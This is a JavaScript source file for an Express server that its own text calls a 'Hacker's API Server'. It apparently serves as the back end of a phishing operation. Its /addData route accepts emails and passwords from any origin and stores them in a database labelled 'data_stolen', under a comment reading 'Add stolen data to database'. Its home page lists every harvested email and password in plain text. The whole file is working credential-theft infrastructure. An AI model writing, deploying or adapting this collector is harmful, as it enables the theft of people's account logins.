const express       = require("express");           // to create endpoint routes
const bodyParser    = require("body-parser");       // to parse request bodies (as middleware)
const Engine        = require('tingodb')();

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// Setup Database (TingoDb) :
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var db              = new Engine.Db('./data_stolen', {});


// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// Setup ExpressJS :
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json())




// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// ROUTE : Cors Pre-flight check
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
app.use(function(req, res, next) 
{
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Credentials", "false");
    res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, OPTIONS, POST, PUT");
    res.setHeader("Access-Control-Allow-Headers", "access-control-allow-methods, access-control-allow-origin, access-control-allow-headers, Content-Type");
    next();
});


// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// ROUTE : Default route
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
app.get("/", function(req, response) 
{
    var style = "<style>table, th, td {border:1px solid black;}</style>"
    var responseStr = style + "<h1> Welcome to the <b>Hacker's API Server<b/> </h1>";
    

    responseStr += "<table style='width:30%'><tr><th>Email</th><th>Password</th></tr>";

    
    // Fetch a collection to insert document into
    collection = db.collection("email_password_collection");

    collection
        .find({}, { "_id": 0})
        .toArray(
            function(err, result) 
            {
                if (err) throw err;
                console.log(result);
                db.close();

                for (const dataSet of result) 
                {
                    responseStr += "<tr><td>"+ dataSet.email +"</td><td>"+ dataSet.pass +"</td></tr>";
                }

                response.send(responseStr + "</table> </br>");
            }
        );
  
    
})


// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// ROUTE : Add stolen data to database
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
app.post("/addData", async (req, response) => 
{
    var newData = { email: req.body.email, pass: req.body.password };

    // Fetch a collection to insert document into
    collection = db.collection("email_password_collection");


    // Insert a single document
    collection.insert(  newData 
                        ,
                        {w:1} 
                        ,
                        function(err, dbResponse) 
                        {
                            // Catch any errors :
                            if (err) throw  response.status(500).json({ 'message': err });

                            console.log("1 document inserted");
                            
                            response.status(201).json({ 'message': dbResponse });
                        }
                    )

})



// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// ROUTE : request to handle undefined or all other routes
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
app.get("*", function(req, res)
{
    res.send("[ SORRY INVALID URL ]");
})





// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// Start Server :
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

// Get port number of this server :
const port = process.env.PORT || 4600;

// Start listening on defined port :
app.listen(port, () => console.log(`Server running on port: ${port}`));